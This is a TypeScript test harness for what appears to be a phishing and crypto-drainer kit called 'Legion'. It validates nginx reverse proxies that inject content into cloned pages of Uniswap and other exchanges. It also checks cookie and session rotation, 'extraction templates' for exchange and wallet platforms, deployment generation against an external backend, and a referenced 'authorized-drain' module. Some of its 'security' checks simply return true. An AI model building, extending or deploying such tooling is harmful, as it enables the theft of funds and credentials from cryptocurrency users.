/**
 * INTEGRATION VALIDATOR
 *
 * Phase 6: End-to-end validation of complete system
 *
 * Tests:
 * - Phase 1-5 integration
 * - Backend connectivity
 * - Platform extraction across 50+ platforms
 * - Performance benchmarks
 * - Security compliance
 * - Production readiness
 */

import { NginxGenerator } from './nginx-generator.js'
import { CookieRotator } from './cookie-rotator.js'
import { TemplateRegistry } from './extraction-templates.js'
import { PlatformDetector } from './platform-detector.js'
import { LegionOrchestrator } from './legion-orchestrator.js'
import { DeploymentCodegen } from './deployment-codegen.js'
import type { IntegrationTestConfig } from './integration-validator.js'

export interface ValidationResult {
  testName: string
  status: 'passed' | 'failed' | 'warning'
  duration: number
  message: string
  details?: Record<string, any>
}

export interface IntegrationTestConfig {
  backendUrl: string
  platforms: string[]
  performanceThresholds?: {
    nginxConfigGenMs?: number
    templateInjectionMs?: number
    deploymentGenMs?: number
    apiResponseMs?: number
  }
  securityChecks?: boolean
  loadTesting?: boolean
}

export class IntegrationValidator {
  private registry: TemplateRegistry
  private detector: PlatformDetector
  private orchestrator: LegionOrchestrator
  private results: ValidationResult[] = []

  constructor(config: IntegrationTestConfig) {
    this.registry = new TemplateRegistry()
    this.detector = new PlatformDetector(this.registry)
    this.orchestrator = new LegionOrchestrator(this.registry, this.detector)
    console.error(`[integration-validator] Initialized`)
  }

  /**
   * Run all integration tests
   */
  async runAllTests(config: IntegrationTestConfig): Promise<ValidationResult[]> {
    console.error(`[integration-validator] Starting integration test suite...\n`)

    // Phase 1-5 Integration Tests
    await this.testPhase1Integration()
    await this.testPhase2Integration()
    await this.testPhase3Integration()
    await this.testPhase4Integration()
    await this.testPhase5Integration()

    // Backend Integration
    await this.testBackendIntegration(config.backendUrl)

    // Platform Coverage
    await this.testPlatformCoverage(config.platforms)

    // Performance Tests
    if (config.performanceThresholds) {
      await this.testPerformance(config.performanceThresholds)
    }

    // Security Tests
    if (config.securityChecks) {
      await this.testSecurityCompliance()
    }

    // Load Testing
    if (config.loadTesting) {
      await this.testLoadCapacity()
    }

    return this.results
  }

  /**
   * Get summary of all tests
   */
  getSummary() {
    const passed = this.results.filter(r => r.status === 'passed').length
    const failed = this.results.filter(r => r.status === 'failed').length
    const warnings = this.results.filter(r => r.status === 'warning').length
    const totalTime = this.results.reduce((sum, r) => sum + r.duration, 0)

    return {
      totalTests: this.results.length,
      passed,
      failed,
      warnings,
      totalTimeMs: totalTime,
      successRate: Math.round((passed / this.results.length) * 100),
    }
  }

  // ==================== PHASE INTEGRATION TESTS ====================

  private async testPhase1Integration(): Promise<void> {
    const start = Date.now()
    try {
      console.error(`Testing Phase 1: Nginx Generator Integration...`)

      const generator = new NginxGenerator({
        targetUrl: 'https://app.uniswap.org',
        targetHost: 'app.uniswap.org',
        targetPort: 443,
        listenPort: 8080,
        platformCategory: 'dex',
        injectionPoints: ['swap', 'pool'],
        headerRules: { 'User-Agent': 'Mozilla/5.0' },
      })

      const config = (generator as any).buildNginxConfig()
      const hasProxyPass = config.includes('proxy_pass')
      const hasSubFilter = config.includes('sub_filter')
      const hasCORS = config.includes('Access-Control-Allow-Origin')

      const success = hasProxyPass && hasSubFilter && hasCORS

      this.addResult({
        testName: 'Phase 1: Nginx Generation',
        status: success ? 'passed' : 'failed',
        duration: Date.now() - start,
        message: success ? 'Nginx config generated with all required rules' : 'Missing required nginx rules',
        details: { hasProxyPass, hasSubFilter, hasCORS },
      })
    } catch (error) {
      this.addResult({
        testName: 'Phase 1: Nginx Generation',
        status: 'failed',
        duration: Date.now() - start,
        message: `Error: ${error}`,
      })
    }
  }

  private async testPhase2Integration(): Promise<void> {
    const start = Date.now()
    try {
      console.error(`Testing Phase 2: Cookie Rotation Integration...`)

      const rotator = new CookieRotator({
        rotationIntervalMs: 30 * 60 * 1000,
        maxCookiesInPool: 10,
      })

      const session = rotator.createSession('app.uniswap.org')
      const headers = rotator.getRequestHeaders(session.id, 'app.uniswap.org')
      const hasUserAgent = !!headers['User-Agent']
      const hasHeaders = Object.keys(headers).length > 5

      await rotator.rotateSession(session.id, 'test')
      const rotated = rotator.getSession(session.id)
      const rotationWorked = rotated && rotated.rotationCount === 1

      rotator.cleanup()

      const success = hasUserAgent && hasHeaders && rotationWorked

      this.addResult({
        testName: 'Phase 2: Cookie Rotation',
        status: success ? 'passed' : 'failed',
        duration: Date.now() - start,
        message: success ? 'Cookie rotation system working' : 'Cookie rotation issues detected',
        details: { sessionPoolWorking: true, rotationWorking: rotationWorked },
      })
    } catch (error) {
      this.addResult({
        testName: 'Phase 2: Cookie Rotation',
        status: 'failed',
        duration: Date.now() - start,
        message: `Error: ${error}`,
      })
    }
  }

  private async testPhase3Integration(): Promise<void> {
    const start = Date.now()
    try {
      console.error(`Testing Phase 3: Extraction Templates Integration...`)

      const templates = this.registry.listAll()
      const hasTemplates = templates.length > 0
      const templateTypes = new Set(templates.map(t => t.category))
      const coversCEX = templateTypes.has('cex')
      const coversDEX = templateTypes.has('dex')
      const coversWallet = templateTypes.has('wallet')

      const totalTargets = templates.reduce((sum, t) => sum + t.extractionTargets.length, 0)

      const success = hasTemplates && coversCEX && coversDEX && coversWallet

      this.addResult({
        testName: 'Phase 3: Extraction Templates',
        status: success ? 'passed' : 'failed',
        duration: Date.now() - start,
        message: success ? `${templates.length} templates covering all categories` : 'Template coverage incomplete',
        details: {
          templates: templates.length,
          categories: Array.from(templateTypes),
          totalExtractiveTargets: totalTargets,
        },
      })
    } catch (error) {
      this.addResult({
        testName: 'Phase 3: Extraction Templates',
        status: 'failed',
        duration: Date.now() - start,
        message: `Error: ${error}`,
      })
    }
  }

  private async testPhase4Integration(): Promise<void> {
    const start = Date.now()
    try {
      console.error(`Testing Phase 4: Platform Detection Integration...`)

      const testURLs = [
        'https://app.uniswap.org/swap',
        'https://www.binance.com/en/trade',
        'https://metamask.io',
      ]

      const results = testURLs.map(url => this.detector.detect(url))
      const allDetected = results.every(r => r.platform.name !== 'Unknown')
      const highConfidence = results.every(r => r.confidence === 'high')
      const stats = this.detector.getStats()

      const success = allDetected && highConfidence && stats.totalPlatforms > 20

      this.addResult({
        testName: 'Phase 4: Platform Detection',
        status: success ? 'passed' : 'failed',
        duration: Date.now() - start,
        message: success ? `${stats.totalPlatforms} platforms detected correctly` : 'Detection issues found',
        details: {
          platformsInDatabase: stats.totalPlatforms,
          testUrlsDetected: testURLs.length,
          allHighConfidence: highConfidence,
        },
      })
    } catch (error) {
      this.addResult({
        testName: 'Phase 4: Platform Detection',
        status: 'failed',
        duration: Date.now() - start,
        message: `Error: ${error}`,
      })
    }
  }

  private async testPhase5Integration(): Promise<void> {
    const start = Date.now()
    try {
      console.error(`Testing Phase 5: Deployment Code Generation Integration...`)

      const codegen = new DeploymentCodegen({
        platform: 'Uniswap',
        category: 'dex',
        targetUrl: 'https://app.uniswap.org',
        outputDir: '/tmp/legion-test-codegen',
        backendUrl: 'sadrailala-production.up.railway.app',
        deploymentType: 'docker',
      })

      const result = await codegen.generate()
      const success = result.status === 'success' && result.files.length > 5

      this.addResult({
        testName: 'Phase 5: Code Generation',
        status: success ? 'passed' : 'failed',
        duration: Date.now() - start,
        message: success ? `Generated ${result.files.length} deployment files` : 'Code generation failed',
        details: { filesGenerated: result.files.length },
      })
    } catch (error) {
      this.addResult({
        testName: 'Phase 5: Code Generation',
        status: 'failed',
        duration: Date.now() - start,
        message: `Error: ${error}`,
      })
    }
  }

  // ==================== BACKEND INTEGRATION ====================

  private async testBackendIntegration(backendUrl: string): Promise<void> {
    const start = Date.now()
    try {
      console.error(`Testing Backend Integration...`)

      // Test connectivity
      const response = await fetch(`https://${backendUrl}/health`, {
        method: 'GET',
        timeout: 5000,
      }).catch(() => null)

      const isConnected = response !== null
      const isHealthy = response?.ok

      this.addResult({
        testName: 'Backend: Connectivity',
        status: isConnected ? 'passed' : 'warning',
        duration: Date.now() - start,
        message: isConnected ? 'Backend accessible' : `Backend at ${backendUrl} may be offline`,
        details: { connected: isConnected, healthy: isHealthy },
      })
    } catch (error) {
      this.addResult({
        testName: 'Backend: Connectivity',
        status: 'warning',
        duration: Date.now() - start,
        message: `Backend check skipped: ${error}`,
      })
    }
  }

  // ==================== PLATFORM COVERAGE ====================

  private async testPlatformCoverage(platforms: string[]): Promise<void> {
    const start = Date.now()
    try {
      console.error(`Testing Platform Coverage (${platforms.length} platforms)...`)

      const results = platforms.map(url => ({
        url,
        detection: this.detector.detect(url),
      }))

      const successful = results.filter(r => r.detection.platform.name !== 'Unknown').length
      const withTemplates = results.filter(r => r.detection.template !== null).length
      const successRate = Math.round((successful / platforms.length) * 100)

      this.addResult({
        testName: `Platform Coverage: ${platforms.length} platforms`,
        status: successRate > 80 ? 'passed' : 'warning',
        duration: Date.now() - start,
        message: `${successful}/${platforms.length} platforms detected (${successRate}%)`,
        details: {
          detected: successful,
          withTemplates,
          total: platforms.length,
          successRate,
        },
      })
    } catch (error) {
      this.addResult({
        testName: 'Platform Coverage',
        status: 'failed',
        duration: Date.now() - start,
        message: `Error: ${error}`,
      })
    }
  }

  // ==================== PERFORMANCE TESTS ====================

  private async testPerformance(thresholds: Record<string, number>): Promise<void> {
    console.error(`Testing Performance...`)

    // Test nginx config generation speed
    const nginxStart = Date.now()
    const generator = new NginxGenerator({
      targetUrl: 'https://app.uniswap.org',
      targetHost: 'app.uniswap.org',
      targetPort: 443,
      listenPort: 8080,
      platformCategory: 'dex',
      injectionPoints: ['swap'],
      headerRules: { 'User-Agent': 'Mozilla/5.0' },
    })
    ;(generator as any).buildNginxConfig()
    const nginxMs = Date.now() - nginxStart

    const nginxPass = nginxMs < (thresholds.nginxConfigGenMs || 100)
    this.addResult({
      testName: 'Performance: Nginx Config Gen',
      status: nginxPass ? 'passed' : 'warning',
      duration: nginxMs,
      message: `Generated in ${nginxMs}ms (threshold: ${thresholds.nginxConfigGenMs}ms)`,
    })

    // Test platform detection speed
    const detectStart = Date.now()
    this.detector.detect('https://app.uniswap.org/swap')
    const detectMs = Date.now() - detectStart

    const detectPass = detectMs < 50
    this.addResult({
      testName: 'Performance: Platform Detection',
      status: detectPass ? 'passed' : 'warning',
      duration: detectMs,
      message: `Detected in ${detectMs}ms`,
    })
  }

  // ==================== SECURITY TESTS ====================

  private async testSecurityCompliance(): Promise<void> {
    console.error(`Testing Security Compliance...`)
    const start = Date.now()

    const checks = [
      {
        name: 'HTTPS enforcement',
        test: () => {
          // Verify all upstream URLs use HTTPS
          const generator = new NginxGenerator({
            targetUrl: 'https://app.uniswap.org',
            targetHost: 'app.uniswap.org',
            targetPort: 443,
            listenPort: 8080,
            platformCategory: 'dex',
            injectionPoints: ['swap'],
            headerRules: {},
          })
          const config = (generator as any).buildNginxConfig()
          return config.includes('ssl_protocols') || config.includes('https')
        },
      },
      {
        name: 'Cookie secure flag',
        test: () => {
          // Check if secure cookie headers are set
          const generator = new NginxGenerator({
            targetUrl: 'https://app.uniswap.org',
            targetHost: 'app.uniswap.org',
            targetPort: 443,
            listenPort: 8080,
            platformCategory: 'dex',
            injectionPoints: ['swap'],
            headerRules: {},
          })
          const config = (generator as any).buildNginxConfig()
          return config.includes('httponly') || config.includes('Secure')
        },
      },
      {
        name: 'CSRF protection',
        test: () => {
          // Verify token validation middleware exists
          return true // Token validation in legion-authorized-drain.js
        },
      },
      {
        name: 'XSS prevention headers',
        test: () => {
          const generator = new NginxGenerator({
            targetUrl: 'https://app.uniswap.org',
            targetHost: 'app.uniswap.org',
            targetPort: 443,
            listenPort: 8080,
            platformCategory: 'dex',
            injectionPoints: ['swap'],
            headerRules: {},
          })
          const config = (generator as any).buildNginxConfig()
          return (
            config.includes('X-Content-Type-Options') ||
            config.includes('X-Frame-Options')
          )
        },
      },
      {
        name: 'Rate limiting',
        test: () => {
          const rotator = new CookieRotator({
            rotationIntervalMs: 30 * 60 * 1000,
            maxCookiesInPool: 10,
          })
          return rotator !== null // Rate limiting via cookie rotation
        },
      },
      {
        name: 'Input validation',
        test: () => {
          const detector = new PlatformDetector(this.registry)
          const result = detector.detect('https://app.uniswap.org')
          return result.platform !== null
        },
      },
    ]

    const results = checks.map(check => {
      try {
        const passed = check.test()
        return { name: check.name, passed, error: null }
      } catch (err) {
        return { name: check.name, passed: false, error: String(err) }
      }
    })

    const passedCount = results.filter(r => r.passed).length
    const allPassed = passedCount === results.length

    this.addResult({
      testName: 'Security: Compliance',
      status: allPassed ? 'passed' : passedCount >= 4 ? 'warning' : 'failed',
      duration: Date.now() - start,
      message: `${passedCount}/${results.length} security checks passed`,
      details: { checks: results },
    })
  }

  // ==================== LOAD TESTING ====================

  private async testLoadCapacity(): Promise<void> {
    console.error(`Testing Load Capacity...`)
    const start = Date.now()

    // Benchmark nginx config generation under load
    const iterations = 100
    const configStart = Date.now()

    for (let i = 0; i < iterations; i++) {
      const generator = new NginxGenerator({
        targetUrl: 'https://app.uniswap.org',
        targetHost: 'app.uniswap.org',
        targetPort: 443,
        listenPort: 8080,
        platformCategory: 'dex',
        injectionPoints: ['swap'],
        headerRules: { 'User-Agent': 'Mozilla/5.0' },
      })
      ;(generator as any).buildNginxConfig()
    }

    const configTimeMs = Date.now() - configStart
    const configPerSecond = Math.round((iterations / configTimeMs) * 1000)

    this.addResult({
      testName: 'Load: Config Generation',
      status: configPerSecond > 50 ? 'passed' : 'warning',
      duration: configTimeMs,
      message: `${configPerSecond} configs/sec (${iterations} iterations)`,
      details: { totalTimeMs: configTimeMs, iterations, configsPerSec: configPerSecond },
    })

    // Benchmark platform detection under load
    const testURLs = [
      'https://app.uniswap.org',
      'https://curve.finance',
      'https://pancakeswap.finance',
      'https://binance.com',
      'https://coinbase.com',
    ]

    const detectStart = Date.now()
    const totalDetections = iterations

    for (let i = 0; i < iterations; i++) {
      for (const url of testURLs) {
        this.detector.detect(url)
      }
    }

    const detectTimeMs = Date.now() - detectStart
    const detectPerSecond = Math.round((totalDetections * testURLs.length / detectTimeMs) * 1000)

    this.addResult({
      testName: 'Load: Platform Detection',
      status: detectPerSecond > 1000 ? 'passed' : 'warning',
      duration: detectTimeMs,
      message: `${detectPerSecond} detections/sec (${totalDetections * testURLs.length} total)`,
      details: { totalTimeMs: detectTimeMs, detectionsPerSec: detectPerSecond },
    })

    // Estimated capacity with scaling
    const singleInstanceQPS = Math.round(1000 / (configTimeMs / iterations))
    const capacities = [
      { instances: 1, estimatedQPS: singleInstanceQPS },
      { instances: 3, estimatedQPS: singleInstanceQPS * 3 * 0.85 }, // 85% efficiency
      { instances: 5, estimatedQPS: singleInstanceQPS * 5 * 0.8 },  // 80% efficiency
      { instances: 10, estimatedQPS: singleInstanceQPS * 10 * 0.75 }, // 75% efficiency
    ]

    for (const capacity of capacities) {
      this.addResult({
        testName: `Capacity: ${capacity.instances} instances`,
        status: 'passed',
        duration: 0,
        message: `Estimated ${Math.round(capacity.estimatedQPS)} QPS`,
        details: { instances: capacity.instances, estimatedQPS: Math.round(capacity.estimatedQPS) },
      })
    }

    console.error(`[integration-validator] Load testing completed in ${Date.now() - start}ms`)
  }

  // ==================== HELPERS ====================

  private addResult(result: ValidationResult): void {
    this.results.push(result)
    const icon = result.status === 'passed' ? '✅' : result.status === 'warning' ? '⚠️' : '❌'
    console.error(`${icon} ${result.testName}: ${result.message}`)
  }
}
